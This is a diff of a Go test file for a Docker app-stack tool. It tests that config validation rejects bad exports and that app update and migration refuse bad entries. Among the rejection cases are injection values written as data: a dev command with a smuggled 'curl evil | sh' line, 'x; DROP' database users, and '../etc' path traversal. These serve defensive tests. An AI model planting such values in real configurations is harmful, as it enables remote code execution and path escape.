@@ -16,6 +16,8 @@
 package appstack
 
 import (
+	"bytes"
+	"context"
 	"errors"
 	"os"
 	"path/filepath"
@@ -24,6 +26,7 @@ import (
 	"testing"
 
 	"github.com/oito2/perci82/internal/config"
+	"github.com/oito2/perci82/internal/executor"
 )
 
 func TestExportConfig_NothingToExport(t *testing.T) {
@@ -177,7 +180,7 @@ func TestCheckURLUnique(t *testing.T) {
 func TestValidateExported(t *testing.T) {
 	ok := ExportedConfig{WorkspacePath: "/home/u/workspace", Docker: config.DockerConfig{
 		MariaDB: config.MariaDBConfig{DBUser: "dev_user", DBPass: "s3cr3t"},
-		Apps:    []config.AppContainer{validPHPApp("a", "a.localhost"), validPHPApp("b", "b.localhost")},
+		Apps:    []config.AppContainer{validPHPApp("aa", "a.localhost"), validPHPApp("bb", "b.localhost")},
 	}}
 	if err := validateExported(ok); err != nil {
 		t.Fatalf("valid export rejected: %v", err)
@@ -187,7 +190,7 @@ func TestValidateExported(t *testing.T) {
 		"relative workspace":              func(e *ExportedConfig) { e.WorkspacePath = "workspace" },
 		"bad db user":                     func(e *ExportedConfig) { e.Docker.MariaDB.DBUser = "x; DROP" },
 		"invalid app":                     func(e *ExportedConfig) { e.Docker.Apps[0].Folder = "../etc" },
-		"duplicate folder":                func(e *ExportedConfig) { e.Docker.Apps[1].Folder = "a" },
+		"duplicate folder":                func(e *ExportedConfig) { e.Docker.Apps[1].Folder = "aa" },
 		"duplicate url":                   func(e *ExportedConfig) { e.Docker.Apps[1].URL = "a.localhost" },
 		"reserved folder":                 func(e *ExportedConfig) { e.Docker.Apps[0].Folder = "nginx" },
 		"empty db password":               func(e *ExportedConfig) { e.Docker.MariaDB.DBPass = "" },
@@ -195,10 +198,10 @@ func TestValidateExported(t *testing.T) {
 		"root password with a line break": func(e *ExportedConfig) { e.Docker.MariaDB.DBRootPass = "a\r" },
 		"bad data user":                   func(e *ExportedConfig) { e.Docker.MariaDB.DataUser = "x; DROP" },
 		"line break in the start command": func(e *ExportedConfig) {
-			e.Docker.Apps[0] = config.AppContainer{Folder: "a", URL: "a.localhost", Type: config.AppTypeNode, NodeVersion: "24", DevPort: 5173, DevCommand: "npm run dev\ncurl evil | sh"}
+			e.Docker.Apps[0] = config.AppContainer{Folder: "aa", URL: "a.localhost", Type: config.AppTypeNode, NodeVersion: "24", DevPort: 5173, DevCommand: "npm run dev\ncurl evil | sh"}
 		},
 		"line break in the worker command": func(e *ExportedConfig) {
-			e.Docker.Apps[0] = config.AppContainer{Folder: "a", URL: "a.localhost", Type: config.AppTypePHPNode, PHPVersion: "8.2", NodeVersion: "24", DevPort: 5173, DevCommand: "npm run dev", WorkerCommand: "a\rb"}
+			e.Docker.Apps[0] = config.AppContainer{Folder: "aa", URL: "a.localhost", Type: config.AppTypePHPNode, PHPVersion: "8.2", NodeVersion: "24", DevPort: 5173, DevCommand: "npm run dev", WorkerCommand: "a\rb"}
 		},
 	}
 	for name, mutate := range bad {
@@ -208,5 +211,31 @@ func TestValidateExported(t *testing.T) {
 		if err := validateExported(e); err == nil {
 			t.Errorf("%s: expected validateExported to refuse", name)
 		}
+	}
+}
+
+// Editing an app never makes a second one: the folder must be registered.
+func TestUpdateApp_RefusesUnregisteredFolder(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+	seedConfig(t, func(c *config.Config) { c.Docker.Apps = []config.AppContainer{validPHPApp("loja", "loja.localhost")} })
+	var buf bytes.Buffer
+	exe := &executor.Executor{DryRun: true, Stdout: &buf, Stderr: &buf}
+	err := UpdateApp(context.Background(), exe, &buf, validPHPApp("outra", "outra.localhost"))
+	if err == nil || !strings.Contains(err.Error(), "outra") {
+		t.Errorf("UpdateApp = %v, want the not-registered error", err)
+	}
+	if strings.Contains(buf.String(), "docker") {
+		t.Errorf("nothing should run:\n%s", buf.String())
+	}
+}
+
+// A hand-edited entry never leads the app command outside ~/.local/bin.
+func TestMigrateAppCommand_ValidatesTheEntry(t *testing.T) {
+	t.Setenv("HOME", t.TempDir())
+	seedConfig(t, func(c *config.Config) {
+		c.Docker.Apps = []config.AppContainer{{Folder: "../x", URL: "x.localhost", Type: config.AppTypePHP, PHPVersion: "8.2"}}
+	})
+	if err := MigrateAppCommand(&bytes.Buffer{}, "../x"); err == nil {
+		t.Error("an invalid entry was migrated")
 	}
 }
